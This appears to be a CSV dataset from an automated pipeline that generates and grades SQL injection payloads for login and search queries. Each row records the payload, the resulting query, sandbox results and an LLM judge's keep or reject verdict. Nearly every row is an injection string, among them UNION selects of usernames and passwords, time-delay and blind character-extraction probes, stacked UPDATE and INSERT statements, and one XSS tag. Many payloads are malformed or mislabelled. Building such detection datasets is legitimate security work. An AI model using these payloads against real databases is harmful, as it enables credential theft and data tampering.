query_id,seed_payload,payload,full_query,llm_attack_category,template_context,label,mutation_count,codebert_score,ast_is_valid,ast_dialect,ast_node_set,sandbox_executed,sandbox_detection_mode,sandbox_exploit_type,judge_malicious_intent_preserved,judge_realistic_for_context,judge_non_trivial_mutation,judge_overall_quality_score,judge_keep,judge_reason,backend,status
q00253,,"-- Comment before AND
SELECT * FROM users WHERE username = 'admin' AND /**/ password = 'admin'","SELECT * FROM users WHERE username = '-- Comment before AND
SELECT * FROM users WHERE username = 'admin' AND /**/ password = 'admin'' AND password = 'anything'",comment_obfuscation,login,1,0,0.0,True,default,"[""And"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,complete_query,comment_obfuscation,True,True,True,4,True,"The candidate payload demonstrates a meaningful mutation of the seed payload, preserving malicious intent while being realistic for the login context.",ollama_local+rules,ok
q00254,,"# Case insensitive comment
SELECT * FROM users WHERE username = 'admin' AND # password = 'admin'","SELECT * FROM users WHERE username = '# Case insensitive comment
SELECT * FROM users WHERE username = 'admin' AND # password = 'admin'' AND password = 'anything'",comment_obfuscation,login,1,0,0.0,False,,[],False,static_only,comment_obfuscation,False,True,True,2,False,malicious intent is not clearly preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes. Rejected by hard rule because AST validation or sandbox execution failed.,heuristic,rejected_pre_judge
q00255,,"/**/ Subquery in comment
SELECT * FROM users WHERE username = 'admin' AND (/**/ SELECT COUNT(*) FROM dual ) --","SELECT * FROM users WHERE username = '/**/ Subquery in comment
SELECT * FROM users WHERE username = 'admin' AND (/**/ SELECT COUNT(*) FROM dual ) --' AND password = 'anything'",comment_obfuscation,login,1,0,0.0,False,,[],False,static_only,comment_obfuscation,False,True,True,2,False,malicious intent is not clearly preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes. Rejected by hard rule because AST validation or sandbox execution failed.,heuristic,rejected_pre_judge
q00256,,"; Encoding in comment
SELECT * FROM users WHERE username = 'admin' AND password = 'admin'; --","SELECT * FROM users WHERE username = '; Encoding in comment
SELECT * FROM users WHERE username = 'admin' AND password = 'admin'; --' AND password = 'anything'",comment_obfuscation,login,1,0,0.0,False,,[],False,static_only,comment_obfuscation,False,True,True,2,False,malicious intent is not clearly preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes. Rejected by hard rule because AST validation or sandbox execution failed.,heuristic,rejected_pre_judge
q00257,,"' OR ""password"" LIKE '--'
SELECT * FROM users WHERE username = 'admin' AND ""password"" LIKE '--'","SELECT * FROM users WHERE username = '' OR ""password"" LIKE '--'
SELECT * FROM users WHERE username = 'admin' AND ""password"" LIKE '--'' AND password = 'anything'",comment_obfuscation,login,1,0,0.0,False,,[],False,static_only,comment_obfuscation,False,True,True,2,False,malicious intent is not clearly preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes. Rejected by hard rule because AST validation or sandbox execution failed.,heuristic,rejected_pre_judge
q00258,,"[""SELECT * FROM products WHERE name LIKE '%' AND /**/ 1=1; --""","SELECT * FROM products WHERE name LIKE '%[""SELECT * FROM products WHERE name LIKE '%' AND /**/ 1=1; --""%'",comment_obfuscation,search,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""Mod"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,tautology,True,True,True,4,True,"The candidate payload is a malicious SQL injection attempt with a comment obfuscation technique, and it is realistic for the search context.",ollama_local+rules,ok
q00259,,-- 1' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0;,SELECT * FROM products WHERE name LIKE '%-- 1' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0;%',comment_obfuscation,search,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,4,True,The candidate payload is a meaningful SQL injection attempt that matches the search context and demonstrates non-trivial mutation from the seed.,ollama_local+rules,ok
q00260,,/**/ 1'/* SQL Injection */ UNION SELECT password FROM users WHERE username = 'admin' /* SQL Injection */;,SELECT * FROM products WHERE name LIKE '%/**/ 1'/* SQL Injection */ UNION SELECT password FROM users WHERE username = 'admin' /* SQL Injection */;%',comment_obfuscation,search,1,0,0.0,True,default,"[""Union"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,blind_boolean,True,True,True,4,True,"The candidate payload contains a SQL injection vulnerability in the 'search' context, with a non-trivial mutation from the seed payload, and is realistic for the given context.",ollama_local+rules,ok
q00261,,1';WAITFOR DELAY '0:0:5'--,SELECT * FROM products WHERE name LIKE '%1';WAITFOR DELAY '0:0:5'--%',comment_obfuscation,search,1,0,0.0,False,,[],False,static_only,stacked_queries,False,True,True,2,False,malicious intent is not clearly preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes. Rejected by hard rule because AST validation or sandbox execution failed.,heuristic,rejected_pre_judge
q00262,,--%'; WAITFOR DELAY '0:0:10' --,SELECT * FROM products WHERE name LIKE '%--%'; WAITFOR DELAY '0:0:10' --%',comment_obfuscation,search,1,0,0.0,True,default,[],True,complete_query,stacked_queries,True,True,True,4,True,"The candidate payload is a malicious SQL injection attempt that maintains its intent and is realistic for the search context, with a non-trivial mutation from the seed.",ollama_local+rules,ok
q00263,,/*#*/'; INSERT INTO logs VALUES ('attack'); --,SELECT * FROM products WHERE name LIKE '%/*#*/'; INSERT INTO logs VALUES ('attack'); --%',comment_obfuscation,search,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Tuple"", ""Select"", ""Column"", ""Identifier"", ""Values"", ""Where"", ""From"", ""Semicolon"", ""Table"", ""Star"", ""Insert""]",True,payload_fragment,stacked_queries,True,True,True,4,True,"The candidate payload contains a malicious comment_obfuscation attack that is plausible in the search context, with non-trivial mutation and successful sandbox execution.",ollama_local+rules,ok
q00264,,'; SELECT name FROM users WHERE id = 1 --,SELECT * FROM products WHERE name LIKE '%'; SELECT name FROM users WHERE id = 1 --%',comment_obfuscation,search,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,4,True,"The candidate payload is a meaningful malicious SQL injection attempt that fits the search context, shows non-trivial mutation from the seed, and has high quality.",ollama_local+rules,ok
q00291,,--+1%27+WAITFOR+DELAY+'0:0:5'+AND+1=1--,SELECT * FROM users WHERE username = '--+1%27+WAITFOR+DELAY+'0:0:5'+AND+1=1--' AND password = 'anything',encoding_obfuscation,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,4,True,"The candidate payload is a meaningful malicious SQL injection attempt with non-trivial mutation, realistic for login context, and high quality.",ollama_local+rules,ok
q00292,,1%27+LIKE+'a%'+AND+(SELECT+CASE+WHEN+1=1+THEN+CHAR(66)+ELSE+NULL+END+FROM+dual)%2B'a',SELECT * FROM users WHERE username = '1%27+LIKE+'a%'+AND+(SELECT+CASE+WHEN+1=1+THEN+CHAR(66)+ELSE+NULL+END+FROM+dual)%2B'a'' AND password = 'anything',encoding_obfuscation,login,1,0,0.0,False,,[],False,static_only,blind_time,False,True,True,2,False,malicious intent is not clearly preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes. Rejected by hard rule because AST validation or sandbox execution failed.,heuristic,rejected_pre_judge
q00293,,1'%27+OR+EXISTS(SELECT+*+FROM+information_schema.tables+WHERE+table_name=CHAR(0x62)+and+table_schema=database())--,SELECT * FROM users WHERE username = '1'%27+OR+EXISTS(SELECT+*+FROM+information_schema.tables+WHERE+table_name=CHAR(0x62)+and+table_schema=database())--' AND password = 'anything',encoding_obfuscation,login,1,0,0.0,False,,[],False,static_only,blind_time,False,True,True,2,False,malicious intent is not clearly preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes. Rejected by hard rule because AST validation or sandbox execution failed.,heuristic,rejected_pre_judge
q00294,,"1'/*%23*/union%20all%20select%20username,%20password%20from%20users--%23","SELECT * FROM users WHERE username = '1'/*%23*/union%20all%20select%20username,%20password%20from%20users--%23' AND password = 'anything'",encoding_obfuscation,login,1,0,0.0,False,,[],False,static_only,comment_obfuscation,False,True,True,2,False,malicious intent is not clearly preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes. Rejected by hard rule because AST validation or sandbox execution failed.,heuristic,rejected_pre_judge
q00295,,1'or%20password%20in(%20(select%20password%20from%20users%20where%20username='admin'))--%23,SELECT * FROM users WHERE username = '1'or%20password%20in(%20(select%20password%20from%20users%20where%20username='admin'))--%23' AND password = 'anything',encoding_obfuscation,login,1,0,0.0,False,,[],False,static_only,comment_obfuscation,False,True,True,2,False,malicious intent is not clearly preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes. Rejected by hard rule because AST validation or sandbox execution failed.,heuristic,rejected_pre_judge
q00296,,1'and%20exists(select%20*%20from%20users%20where%20username='admin')--%23,SELECT * FROM users WHERE username = '1'and%20exists(select%20*%20from%20users%20where%20username='admin')--%23' AND password = 'anything',encoding_obfuscation,login,1,0,0.0,False,,[],False,static_only,comment_obfuscation,False,True,True,2,False,malicious intent is not clearly preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes. Rejected by hard rule because AST validation or sandbox execution failed.,heuristic,rejected_pre_judge
q00297,,1'and%20password='%23'%'--%23,SELECT * FROM users WHERE username = '1'and%20password='%23'%'--%23' AND password = 'anything',encoding_obfuscation,login,1,0,0.0,False,,[],False,static_only,comment_obfuscation,False,True,True,2,False,malicious intent is not clearly preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes. Rejected by hard rule because AST validation or sandbox execution failed.,heuristic,rejected_pre_judge
q00298,,1' + CHAR(0x23) + ' OR EXISTS(SELECT * FROM users WHERE username = 'admin' AND password LIKE '%',SELECT * FROM users WHERE username = '1' + CHAR(0x23) + ' OR EXISTS(SELECT * FROM users WHERE username = 'admin' AND password LIKE '%'' AND password = 'anything',encoding_obfuscation,login,1,0,0.0,False,,[],False,static_only,blind_time,False,True,True,2,False,malicious intent is not clearly preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes. Rejected by hard rule because AST validation or sandbox execution failed.,heuristic,rejected_pre_judge
q00299,,"1'/**/UNION/**/ALL/**/SELECT/**/username,password/**/FROM/**/users/**/--","SELECT * FROM users WHERE username = '1'/**/UNION/**/ALL/**/SELECT/**/username,password/**/FROM/**/users/**/--' AND password = 'anything'",encoding_obfuscation,login,1,0,0.0,True,default,"[""Union"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,comment_obfuscation,True,True,True,4,True,"The candidate payload maintains malicious intent by injecting a UNION SELECT statement in the login context, is realistic for login scenarios, and represents a non-trivial mutation from the seed payload.",ollama_local+rules,ok
q00300,,/*1'*/ WAITFOR DELAY '0:0:5' /*2'*/,SELECT * FROM users WHERE username = '/*1'*/ WAITFOR DELAY '0:0:5' /*2'*/' AND password = 'anything',encoding_obfuscation,login,1,0,0.0,False,,[],False,static_only,blind_time,False,True,True,2,False,malicious intent is not clearly preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes. Rejected by hard rule because AST validation or sandbox execution failed.,heuristic,rejected_pre_judge
q00303,,%' OR EXISTS(SELECT*FROM users WHERE username='admin')/*,SELECT * FROM products WHERE name LIKE '%%' OR EXISTS(SELECT*FROM users WHERE username='admin')/*%',encoding_obfuscation,search,1,0,0.0,False,,[],False,static_only,comment_obfuscation,False,True,True,2,False,malicious intent is not clearly preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes. Rejected by hard rule because AST validation or sandbox execution failed.,heuristic,rejected_pre_judge
q00306,,"%\' OR 4747 = DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(67)||CHR(79)||CHR(101),5)""","SELECT * FROM products WHERE name LIKE '%%\' OR 4747 = DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(67)||CHR(79)||CHR(101),5)""%'",encoding_obfuscation,search,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Anonymous"", ""Literal"", ""DPipe"", ""Select"", ""Identifier"", ""Dot"", ""Where"", ""Chr"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,blind_time,True,True,True,4,True,The candidate payload is a meaningful SQL injection attempt that matches the search context and demonstrates non-trivial mutation from the seed.,ollama_local+rules,ok
q00307,,"%\' UNION ALL SELECT NULL,NULL,NULL,NULL\""""","SELECT * FROM products WHERE name LIKE '%%\' UNION ALL SELECT NULL,NULL,NULL,NULL\""""%'",encoding_obfuscation,search,1,0,0.0,False,,[],False,static_only,union_based,False,True,True,2,False,malicious intent is not clearly preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes. Rejected by hard rule because AST validation or sandbox execution failed.,heuristic,rejected_pre_judge
q00308,,"%\' AND WAITFOR DELAY '0:0:5'""","SELECT * FROM products WHERE name LIKE '%%\' AND WAITFOR DELAY '0:0:5'""%'",encoding_obfuscation,search,1,0,0.0,False,,[],False,static_only,blind_time,False,True,True,2,False,malicious intent is not clearly preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes. Rejected by hard rule because AST validation or sandbox execution failed.,heuristic,rejected_pre_judge
q00310,,%25'%20OR%20EXISTS(SELECT%20*%20FROM%20users%20WHERE%20username=%27admin%27)%2F*,SELECT * FROM products WHERE name LIKE '%%25'%20OR%20EXISTS(SELECT%20*%20FROM%20users%20WHERE%20username=%27admin%27)%2F*%',encoding_obfuscation,search,1,0,0.0,False,,[],False,static_only,tautology,False,True,True,2,False,malicious intent is not clearly preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes. Rejected by hard rule because AST validation or sandbox execution failed.,heuristic,rejected_pre_judge
q00311,,"'%2BCHAR(0x27)%2BAND%20ASCII(SUBSTRING((SELECT%20password%20FROM%20users%20LIMIT%201),%201,%201))%20>%2050--","SELECT * FROM products WHERE name LIKE '%'%2BCHAR(0x27)%2BAND%20ASCII(SUBSTRING((SELECT%20password%20FROM%20users%20LIMIT%201),%201,%201))%20>%2050--%'",encoding_obfuscation,search,1,0,0.0,False,,[],False,static_only,blind_time,False,True,True,2,False,malicious intent is not clearly preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes. Rejected by hard rule because AST validation or sandbox execution failed.,heuristic,rejected_pre_judge
q00312,,%25'%20OR%20WAITFOR%20DELAY%20%270:0:5%27%20AND%20%28%29%22,SELECT * FROM products WHERE name LIKE '%%25'%20OR%20WAITFOR%20DELAY%20%270:0:5%27%20AND%20%28%29%22%',encoding_obfuscation,search,1,0,0.0,True,databricks,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""JSONExtract"", ""Mod"", ""JSONPathKey"", ""From"", ""Star"", ""Table"", ""JSONPathRoot"", ""JSONPath"", ""Column""]",True,payload_fragment,blind_time,True,True,True,4,True,The candidate payload is a meaningful malicious SQL injection attempt that matches the search context and demonstrates non-trivial mutation from the seed.,ollama_local+rules,ok
q00313,,"%25'%20UNION%20SELECT%20NULL,NULL,NULL(CHAR(0x23))","SELECT * FROM products WHERE name LIKE '%%25'%20UNION%20SELECT%20NULL,NULL,NULL(CHAR(0x23))%'",encoding_obfuscation,search,1,0,0.0,True,mysql,"[""EQ"", ""Anonymous"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""Mod"", ""Chr"", ""From"", ""Join"", ""Table"", ""Star"", ""HexString"", ""Column""]",True,payload_fragment,blind_boolean,True,True,True,4,True,The candidate payload is a meaningful malicious SQL injection attempt that matches the search context and demonstrates non-trivial mutation from the seed.,ollama_local+rules,ok
q00334,,"(SELECT IF((ASCII(SUBSTRING(password,1,1))=81),1,2) FROM (SELECT password FROM users WHERE username='{input}') AS a--","SELECT * FROM users WHERE username = '(SELECT IF((ASCII(SUBSTRING(password,1,1))=81),1,2) FROM (SELECT password FROM users WHERE username='{input}') AS a--' AND password = 'anything'",nested_injection,login,1,0,0.0,True,mysql,"[""Struct"", ""EQ"", ""Paren"", ""Select"", ""Identifier"", ""Where"", ""Alias"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,comment_obfuscation,True,True,True,4,True,"The candidate payload demonstrates a nested SQL injection attack with a valid AST and sandbox execution, showing meaningful mutation from the seed.",ollama_local+rules,ok
q00335,,"' OR EXISTS(SELECT * FROM (SELECT username,password FROM users WHERE username='{input}')) AND '%'='%","SELECT * FROM users WHERE username = '' OR EXISTS(SELECT * FROM (SELECT username,password FROM users WHERE username='{input}')) AND '%'='%' AND password = 'anything'",nested_injection,login,1,0,0.0,True,default,"[""And"", ""Or"", ""EQ"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Exists"", ""Star"", ""Column""]",True,payload_fragment,tautology,True,True,True,4,True,"The candidate payload is a valid nested SQL injection attack that maintains malicious intent, is realistic for the login context, and represents a non-trivial mutation from the seed.",ollama_local+rules,ok
q00337,,"IF(EXISTS(SELECT 1 FROM (SELECT username,password FROM users WHERE username='{input}') AS b),1,2)--","SELECT * FROM users WHERE username = 'IF(EXISTS(SELECT 1 FROM (SELECT username,password FROM users WHERE username='{input}') AS b),1,2)--' AND password = 'anything'",nested_injection,login,1,0,0.0,True,default,"[""TableAlias"", ""EQ"", ""If"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""From"", ""Table"", ""Exists"", ""Where"", ""Column""]",True,complete_query,comment_obfuscation,True,True,True,4,True,"The candidate payload demonstrates a nested SQL injection attack with a valid AST and sandbox execution, showing meaningful mutation from the seed.",ollama_local+rules,ok
q00339,,"-- (SELECT COUNT(*) FROM users WHERE username LIKE CONCAT('{input}', '%'))","SELECT * FROM users WHERE username = '-- (SELECT COUNT(*) FROM users WHERE username LIKE CONCAT('{input}', '%'))' AND password = 'anything'",nested_injection,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,4,True,"The candidate payload is a nested SQL injection attack that is plausible in the login context, shows non-trivial mutation from the seed, and maintains malicious intent.",ollama_local+rules,ok
q00341,,{username}'; EXECUTE FUNCTION get_user_id('{input}')--,SELECT * FROM users WHERE username = '{username}'; EXECUTE FUNCTION get_user_id('{input}')--' AND password = 'anything',nested_injection,login,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Command"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,4,True,"The candidate payload demonstrates a nested SQL injection attack with a valid AST and successful sandbox execution, showing a meaningful mutation from the seed.",ollama_local+rules,ok
q00343,,"(SELECT 1 FROM (SELECT username FROM users WHERE username='{input}' UNION SELECT username FROM users WHERE username='<script>alert(""XSS"")</script>') AS sub)","SELECT * FROM users WHERE username = '(SELECT 1 FROM (SELECT username FROM users WHERE username='{input}' UNION SELECT username FROM users WHERE username='<script>alert(""XSS"")</script>') AS sub)' AND password = 'anything'",nested_injection,login,1,0,0.0,True,default,"[""TableAlias"", ""Union"", ""EQ"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""From"", ""Table"", ""Where"", ""Column""]",True,complete_query,blind_boolean,True,True,True,4,True,The candidate payload is a valid nested SQL injection attack that demonstrates a malicious intent and is realistic for the login context.,ollama_local+rules,ok
q00344,,' OR (SELECT CASE WHEN username=CAST((SELECT 'admin' from users LIMIT 1) AS VARCHAR) THEN 1 ELSE 0 END FROM users WHERE username='{input}'),SELECT * FROM users WHERE username = '' OR (SELECT CASE WHEN username=CAST((SELECT 'admin' from users LIMIT 1) AS VARCHAR) THEN 1 ELSE 0 END FROM users WHERE username='{input}')' AND password = 'anything',nested_injection,login,1,0,0.0,True,default,"[""Case"", ""Or"", ""EQ"", ""If"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""Limit"", ""From"", ""Table"", ""Cast"", ""Star"", ""DataType"", ""Column""]",True,payload_fragment,nested_injection,True,True,True,4,True,"The candidate payload is a valid nested SQL injection attack that maintains malicious intent, is realistic for the login context, and represents a non-trivial mutation from the seed payload.",ollama_local+rules,ok
q00346,,' AND (SELECT COUNT(*) FROM users WHERE username LIKE '%' OR 1=1) --,SELECT * FROM products WHERE name LIKE '%' AND (SELECT COUNT(*) FROM users WHERE username LIKE '%' OR 1=1) --%',nested_injection,search,1,0,0.0,True,default,"[""And"", ""Or"", ""EQ"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""Count"", ""From"", ""Like"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,tautology,True,True,True,4,True,"The candidate payload is a nested SQL injection attack that is plausible in the search context, shows non-trivial mutation from the seed, and maintains malicious intent.",ollama_local+rules,ok
q00347,,'; WAITFOR DELAY '0:0:10' AND (SELECT NULL FROM sysobjects WHERE xtype='U')--,SELECT * FROM products WHERE name LIKE '%'; WAITFOR DELAY '0:0:10' AND (SELECT NULL FROM sysobjects WHERE xtype='U')--%',nested_injection,search,1,0,0.0,False,,[],False,static_only,stacked_queries,False,True,True,2,False,malicious intent is not clearly preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes. Rejected by hard rule because AST validation or sandbox execution failed.,heuristic,rejected_pre_judge
q00348,,') OR 1>1; SELECT * FROM sensitive_data WHERE id = (SELECT 1 FROM information_schema.tables WHERE table_name='users') --,SELECT * FROM products WHERE name LIKE '%') OR 1>1; SELECT * FROM sensitive_data WHERE id = (SELECT 1 FROM information_schema.tables WHERE table_name='users') --%',nested_injection,search,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Paren"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""GT"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,4,True,The candidate payload contains a nested SQL injection attack that is plausible for the 'search' context. It demonstrates a non-trivial mutation from the seed payload and is executed successfully in the sandbox.,ollama_local+rules,ok
q00349,,'; UPDATE products SET price = 0 WHERE id IN ((SELECT id FROM orders WHERE user_id = 1))--,SELECT * FROM products WHERE name LIKE '%'; UPDATE products SET price = 0 WHERE id IN ((SELECT id FROM orders WHERE user_id = 1))--%',nested_injection,search,1,0,0.0,True,default,"[""EQ"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""Update"", ""From"", ""In"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,4,True,The candidate payload contains a nested SQL injection vulnerability that is plausible for the 'search' context. The mutation is non-trivial and the attack category matches the template context.,ollama_local+rules,ok
q00350,,"') UNION SELECT username, password FROM admin_users --","SELECT * FROM products WHERE name LIKE '%') UNION SELECT username, password FROM admin_users --%'",nested_injection,search,1,0,0.0,True,default,"[""Union"", ""EQ"", ""Paren"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,blind_boolean,True,True,True,4,True,The candidate payload is a meaningful nested SQL injection attack that matches the search context and demonstrates non-trivial mutation from the seed.,ollama_local+rules,ok
q00352,,"; WAITFOR DELAY '0:0:5' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE(chr(66)||chr(67)||chr(79)||chr(101), 5) FROM DUAL) --","SELECT * FROM products WHERE name LIKE '%; WAITFOR DELAY '0:0:5' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE(chr(66)||chr(67)||chr(79)||chr(101), 5) FROM DUAL) --%'",nested_injection,search,1,0,0.0,False,,[],False,static_only,blind_time,False,True,True,2,False,malicious intent is not clearly preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes. Rejected by hard rule because AST validation or sandbox execution failed.,heuristic,rejected_pre_judge
q00353,,") OR (SELECT ASCII(SUBSTRING(password, 1, 1)) FROM users WHERE username = 'admin')) > 64 --","SELECT * FROM products WHERE name LIKE '%) OR (SELECT ASCII(SUBSTRING(password, 1, 1)) FROM users WHERE username = 'admin')) > 64 --%'",nested_injection,search,1,0,0.0,False,,[],False,static_only,comment_obfuscation,False,True,True,2,False,malicious intent is not clearly preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes. Rejected by hard rule because AST validation or sandbox execution failed.,heuristic,rejected_pre_judge
